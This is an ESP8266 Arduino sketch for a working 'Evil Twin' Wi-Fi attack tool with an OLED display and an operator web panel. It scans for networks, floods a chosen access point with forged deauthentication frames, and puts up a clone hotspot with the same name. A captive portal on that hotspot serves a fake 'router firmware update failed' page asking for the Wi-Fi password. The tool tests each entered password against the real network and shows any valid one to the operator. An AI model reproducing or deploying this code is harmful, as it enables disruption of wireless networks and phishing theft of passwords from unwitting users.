// Maded by Batuhan Türker
#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>
#include <U8g2lib.h>

extern "C" {
#include "user_interface.h"
}


U8G2_SSD1306_128X64_NONAME_F_SW_I2C u8g2(U8G2_R0, /* clock=*/ 14, /* data=*/ 12, /* reset=*/ U8X8_PIN_NONE); 
unsigned long startTime = 0;  
bool hotspot_was_active = false; 

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}
#define SUBTITLE "WIFI ROUTER RESCUE MODE"
#define TITLE "&#9888;Firmware Update Failed"
#define BODY "<h3>Your Router encountered a problem while automatically installing the latest firmware update.</h3><br><h4>In order to Restore Router old Firmware,<br> Please Verify Your Password.</h4>"

String _correct = "";
String _tryPassword = "";

#define SUBTITLE "WIFI ROUTER RESCUE MODE"
#define TITLE "&#9888;Firmware Update Failed"
#define BODY "<p>Your Router encountered a problem while automatically installing the latest firmware update.</p><br><p>In order to restore the old Firmware, please verify your password.</p>"

String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #FF2D00; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }"
               ;
  String h = "<!DOCTYPE html><html>"
             "<head><title><center>" + a + " :: " + t + "</center></title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style>"
             "<meta charset=\"UTF-8\"></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String footer() {
  String a = String(_selectedNetwork.ssid);
  return "</div><div class=q><a><center>" + a + " &#169; All Rights Reserved.</center></a></div>";
}

String index() {
  return header(TITLE) + R"(
        <div>
            <p>Your router encountered a problem while automatically installing the latest firmware update.</p>
            <p>In order to restore the old firmware, please verify your password.</p>
        </div>
        <div>
            <form action='/' method='post'>
                <label for='password'>WiFi password:</label>
                <input type='password' id='password' name='password' minlength='8'>
                <input type='submit' value='Continue'>
            </form>
        </div>
    )" + footer();
}

void displayTargetSelection() {
  u8g2.clearBuffer();  
  u8g2.setFont(u8g2_font_ncenB08_tr); 


  u8g2.drawStr(0, 15, "Choose the Target");

  int yOffset = 30; 


  for (int i = 0; i < 16; i++) {
    if (_networks[i].ssid == "") {
      break; 
    }

    String networkInfo = String(i + 1) + ": " + _networks[i].ssid; 
    u8g2.drawStr(0, yOffset, networkInfo.c_str()); 

    yOffset += 10; 
  }

  u8g2.sendBuffer(); 
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  u8g2.begin();

  
  String softAP_SSID = "Iphone(" + String(ESP.getChipId()) + ")";
  const char* softAP_Password = "nodemcu1116";

  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP(softAP_SSID.c_str(), softAP_Password);
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/pro", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();

  u8g2.begin(); 
  u8g2.clearBuffer();
  
  
  u8g2.setFont(u8g2_font_ncenB12_tr);
  int evilTwinX = (128 - u8g2.getStrWidth("EVIL TWIN")) / 2;
  u8g2.drawStr(evilTwinX, 20, "EVIL TWIN");

  
  u8g2.setFont(u8g2_font_ncenB08_tr);
  int batuhanX = (128 - u8g2.getStrWidth("Batuhan Turker")) / 2;
  u8g2.drawStr(batuhanX, 58, "Batuhan Turker");

  u8g2.setFont(u8g2_font_ncenB08_tr);
  u8g2.drawStr(100, 40, "v1.0");
  u8g2.sendBuffer();
  unsigned long startTime = millis();
  delay(10000); 
  u8g2.clearBuffer();
  displayTargetSelection();  
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }

      network.ch = WiFi.RSSI(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    }
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong><br>Wrong Password</h2><p>Please, try again.</p></center></body> </html>");
    Serial.println("Wrong password tried!");
  } else {
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP("Iphone(2)", "arduino1610");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    Serial.println("Good password was entered !");
    Serial.println(_correct);

    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_ncenB08_tr);
    u8g2.drawStr(0, 20, "Password Found:");
    u8g2.drawStr(0, 40, _tryPassword.c_str());
    u8g2.sendBuffer();
  }
}

String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style> .content {max-width: 10000px; min-width: 1px; margin: center; border-collapse: collapse;padding-left:1px;padding-right:1px;}table, th, td {border: 3px solid red; color: white; background-color: black; border-radius: 5px; border-collapse: collapse;padding-left:2px;padding-right:0px;}</style>"
                   "</head><body style='background-color:black; color: white;'><div class='content'>"
                   "<div><center><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                   "<button style='background-color: black; border: 5px solid red; border-radius: 10px; padding: 14px 28px; font-size: 15px; cursor: pointer; color: white; display:inline-block;'{disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                   "<button style='background-color: black; border: 5px solid red; border-radius: 10px; padding: 14px 28px; font-size: 15px; cursor: pointer; color: white'{disabled}>{hotspot_button}</button></form>"
                   "<button style='background-color: black; border: 5px solid red; border-radius: 10px; padding: 14px 28px; font-size: 15px; cursor: pointer; color: white' onclick='window.location.reload();'>Refresh WIFI</button></center>"

                   "</div></br><center><table><tr><th>SSID</th><th>BSSID</th><th>-dBm</th><th>Select</th></tr></center>";





void handleIndex() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
        startTime = millis();
        
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_ncenB08_tr);
        u8g2.drawStr(0, 20, ("Target: " + _selectedNetwork.ssid).c_str());
        

        if (_selectedNetwork.ssid != "") {
          unsigned long elapsedTime = millis() - startTime;
          int seconds = elapsedTime / 1000;
          int minutes = seconds / 60;
          int hours = minutes / 60;

          String elapsedTimeStr = String(hours) + ":" + String(minutes % 60) + ":" + String(seconds % 60);

          u8g2.drawStr(0, 40, ("Time: " + elapsedTimeStr).c_str());
        }

        u8g2.sendBuffer();
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("Iphone(2)", "arduino1610");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
      } else {
        _html += "<button>Select</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "STOP Deauthing");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "START Deauthing");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "STOP EvilTwin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "START EvilTwin");
      _html.replace("{hotspot}", "start");
    }


    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      if (webServer.arg("deauth") == "start") {
        deauthing_active = false;
      }
      delay(1000);
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><center><h2 style='font-size:7vw'>Checking Password, Please Wait...<br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
      if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
      }
    } else {
      webServer.send(200, "text/html", index());
    }
  }

}

void handleAdmin() {

  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("Iphone(2)", "arduino1610");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if ( _networks[i].ssid == "") {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";

    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
    } else {
      _html += "<button>Select</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "STOP Deauthing");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "START Deauthing");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "STOP EvilTwin");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "START EvilTwin");
    _html.replace("{hotspot}", "start");
  }


  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div></body></html>";
  webServer.send(200, "text/html", _html);

}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;


void loop() {
    dnsServer.processNextRequest(); 
    webServer.handleClient(); 

    
    if (deauthing_active && millis() - deauth_now >= 1000) {
        uint8_t deauthPacket[26] = {
            /*  0 - 1  */ 0xC0, 0x00, 
            /*  2 - 3  */ 0x00, 0x00,
            /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 
            /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 
            /* 22 - 23 */ 0x00, 0x00, 
            /* 24 - 25 */ 0x01, 0x00 
        };

       
        WiFi.macAddress(deauthPacket + 10); 
        memcpy(deauthPacket + 16, _selectedNetwork.bssid, 6); 
        wifi_send_pkt_freedom(deauthPacket, 26, 0);
        deauth_now = millis();
    }

    if (millis() - now >= 15000) {
        performScan();
        now = millis();
    }

    if (millis() - wifinow >= 2000) {
        if (WiFi.status() != WL_CONNECTED) {
            Serial.println("BAD");
        } else {
            Serial.println("GOOD");
        }
        wifinow = millis();
    }

    
     if (hotspot_active) {
        
        if (millis() - startTime >= 1000) {
            unsigned long elapsedTime = millis() - startTime;
            int seconds = elapsedTime / 1000;
            int minutes = seconds / 60;
            int hours = minutes / 60;
            
            String elapsedTimeStr = String(hours) + ":" + String(minutes % 60) + ":" + String(seconds % 60);

            
            u8g2.clearBuffer();
            u8g2.setFont(u8g2_font_ncenB08_tr);
            u8g2.drawStr(0, 20, "Evil Twin: Active");

            
            if (_selectedNetwork.ssid != "") {
                u8g2.drawStr(0, 40, ("Target: " + _selectedNetwork.ssid).c_str());
            }

            u8g2.drawStr(0, 60, ("Time: " + elapsedTimeStr).c_str());
            u8g2.sendBuffer();

            
            startTime = millis();
        }
    } else {
        
        hotspot_was_active = false;
        startTime = millis(); 
    }
}
